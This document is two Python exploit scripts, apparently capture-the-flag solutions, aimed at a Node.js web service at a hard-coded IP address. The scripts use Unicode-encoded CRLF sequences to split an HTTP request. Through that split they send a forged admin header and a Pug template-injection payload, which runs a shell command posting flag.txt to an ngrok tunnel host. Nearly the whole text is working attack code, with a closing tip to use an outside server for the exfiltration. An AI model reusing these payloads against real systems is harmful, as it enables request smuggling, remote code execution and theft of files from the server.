Exploit Solve 1 :

# coding=UTF-8
import requests
from requests.utils import quote
def toOct(str):
	r=""
	for i in str:
		if i>='a'and i<='z':
			r+='\\'+oct(ord(i))[1:]
		else:
			r+=i
	return r

#This next line could test in nodejs interpreter so that we can observe the similar behavior about how http treat on unicode(\u{xxxx} is js encode pattern)
#Buffer.from('http://example.com/\u{010D}\u{010A}/test', 'latin1').toString() 
#Unicode čĊ will convert to latin1 which will only pick up the right most byte
SPACE=u'\u0120'.encode('utf-8')
CRLF=u'\u010d\u010a'.encode('utf-8')  # transfer from unicode to utf-8 (\uxxxx is unicode's pattern)
SLASH=u'\u012f'.encode('utf-8')

pug = toOct('''-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl 0.tcp.ngrok.io:10269 -X POST -d @flag.txt'))")()''').replace('"','%22').replace("'","%27")#' and " need to be double encoded
print quote(pug)

payload='sol'+SPACE+'HTTP'+SLASH+'1.1'+CRLF*2+'GET'+SPACE+SLASH+'flag'+SPACE+'HTTP'+SLASH+'1.1'+CRLF+'x-forwarded-for:'+SPACE+'127.0.0.1'+CRLF+'adminauth:'+SPACE+'secretpassword'+CRLF+'pug:'+SPACE+pug+CRLF+'test:'+SPACE
# http://139.59.26.107:11115/
res=requests.get('http://139.59.26.107:11115/core?q='+quote(payload))
#res=requests.get('http://139.59.26.107:11115/core?q='+requote_uri(payload))
print res.content



====================================

Exploit Solve 2 .

import requests
from requests.utils import quote
def toOct(str):
        r=""
        for i in str:
                if i>='a'and i<='z':
                        r+='\\'+oct(ord(i))[1:]
                else:
                        r+=i
        return r
SPACE=u'\u0220'.encode('utf-8')
CRLF=u'\u020d\u010a'.encode('utf-8') 
SLASH=u'\u022f'.encode('utf-8')
pug = toOct('''-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl 0.tcp.ngrok.io:10269 -X POST -d @flag.txt'))")()''').replace('"','%22').replace("'","%27")#' and " need to be double encoded to make it a valid request
print quote(pug)
payload='sol'+SPACE+'HTTP'+SLASH+'1.1'+CRLF*2+'GET'+SPACE+SLASH+'flag'+SPACE+'HTTP'+SLASH+'1.1'+CRLF+'adminauth:'+SPACE+'secretpassword'+CRLF+'pug:'+SPACE+pug+CRLF+'test:'+SPACE
print payload
print quote(payload)
res=requests.get('http://139.59.26.107:11115/core?q='+quote(payload))
print res.content
#http://139.59.26.107:11115/



Use TCP Ngrok Or AW Server ...
